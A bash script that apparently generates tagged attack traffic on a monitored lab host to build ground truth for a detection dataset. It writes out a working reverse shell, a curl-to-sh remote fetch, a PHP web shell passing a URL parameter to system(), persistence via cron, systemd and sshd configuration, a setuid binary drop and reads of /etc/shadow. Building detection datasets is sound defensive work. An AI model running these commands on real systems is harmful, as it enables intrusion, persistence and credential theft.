#!/bin/bash
# Attack traffic for the FACT dataset.
#
# Runs on the monitored host while the capture is running, normally launched by
# orchestrate.sh --attacks. The sink for the reverse shell and the exfiltration
# connects is opened by the caller; this script only talks to it.
#
# Every attack is given a unique tag that appears in the paths and arguments it
# uses, and each run is appended to a JSONL manifest used as ground truth.
set -euo pipefail

_DURATION="${1:-300}"
SITE_URL="${2:-http://10.10.0.10}"
WP_DIR="${WP_DIR:-/usr/share/wordpress}"
SINK="${SINK:-10.10.0.1:4444}"
GAP="${GAP:-5}"
MANIFEST="${MANIFEST:-/tmp/attacks-manifest.jsonl}"

SUDO=""
[ "$(id -u)" -ne 0 ] && SUDO="sudo"

SINK_HOST="${SINK%%:*}"
SINK_PORT="${SINK##*:}"

TAG=""

log() { printf '[attacks] %s\n' "$*" >&2; }

json_escape() {
    local s=${1-}
    s=${s//\\/\\\\}
    s=${s//\"/\\\"}
    s=${s//$'\n'/\\n}
    s=${s//$'\r'/\\r}
    s=${s//$'\t'/\\t}
    printf '%s' "$s"
}

persist_cron() {
    $SUDO mkdir -p /etc/cron.d
    printf '# %s\n* * * * * root /bin/true\n' "$TAG" | $SUDO tee "/etc/cron.d/$TAG" >/dev/null
}

persist_systemd() {
    $SUDO tee "/etc/systemd/system/$TAG.service" >/dev/null <<EOF
[Unit]
Description=$TAG

[Service]
Type=oneshot
ExecStart=/bin/true
EOF
    $SUDO systemctl daemon-reload >/dev/null 2>&1 || true
}

persist_sshd() {
    $SUDO mkdir -p /etc/ssh/sshd_config.d
    printf '# %s\nPermitRootLogin prohibit-password\n' "$TAG" |
        $SUDO tee "/etc/ssh/sshd_config.d/$TAG.conf" >/dev/null
}

tamper_binary() {
    $SUDO cp /bin/true "/usr/bin/$TAG"
}

setuid_drop() {
    printf '#!/bin/bash\nexit 0 # %s\n' "$TAG" | $SUDO tee "/usr/bin/$TAG" >/dev/null
    $SUDO chmod 4755 "/usr/bin/$TAG"
}

webshell_drop() {
    $SUDO mkdir -p "$WP_DIR/wp-content/plugins"
    $SUDO tee "$WP_DIR/wp-content/plugins/$TAG.php" >/dev/null <<EOF
<?php // $TAG
if (isset(\$_GET['c'])) { system(\$_GET['c']); }
EOF
}

webshell_exec() {
    webshell_drop
    curl -fsS --max-time 5 "${SITE_URL%/}/wp-content/plugins/$TAG.php?c=id%3B%23$TAG" \
        >/dev/null 2>&1 || true
    $SUDO rm -f "$WP_DIR/wp-content/plugins/$TAG.php"
}

reverse_shell() {
    timeout 5 bash -c "bash -i >& /dev/tcp/$SINK_HOST/$SINK_PORT 0>&1 # $TAG" || true
}

curl_pipe_sh() {
    curl -fsS --max-time 5 "http://$SINK_HOST:$SINK_PORT/$TAG" 2>/dev/null | sh || true
}

exfil_connect() {
    curl -fsS --max-time 5 -o /dev/null "http://$SINK_HOST:$SINK_PORT/$TAG" || true
}

cred_read() {
    $SUDO grep -F "$TAG" /etc/shadow >/dev/null 2>&1 || true
    $SUDO grep -RF "$TAG" "$WP_DIR/wp-config.php" >/dev/null 2>&1 || true
}

ATTACKS=(
    persist_cron
    persist_systemd
    persist_sshd
    tamper_binary
    setuid_drop
    webshell_drop
    webshell_exec
    reverse_shell
    curl_pipe_sh
    exfil_connect
    cred_read
)

for attack in "${ATTACKS[@]}"; do
    TAG="atk-$attack-$(date +%s)-$RANDOM"
    log "running $attack ($TAG)"

    start=$(date +%s%N)
    "$attack" || log "$attack failed (continuing)"
    end=$(date +%s%N)

    printf '{"technique":"%s","tag":"%s","start_ts_ns":%s,"end_ts_ns":%s,"hostname":"%s"}\n' \
        "$(json_escape "$attack")" "$(json_escape "$TAG")" "$start" "$end" \
        "$(json_escape "$(hostname)")" >>"$MANIFEST"
    sleep "$GAP"
done

log "done; manifest: $MANIFEST"
